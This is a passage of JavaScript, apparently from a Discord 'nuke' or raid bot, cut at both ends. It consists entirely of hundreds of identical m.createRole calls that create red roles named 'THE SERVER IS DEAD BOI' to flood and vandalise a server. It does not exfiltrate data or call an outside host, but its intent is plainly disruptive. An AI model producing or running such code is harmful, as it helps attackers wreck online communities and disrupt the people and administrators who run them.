        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
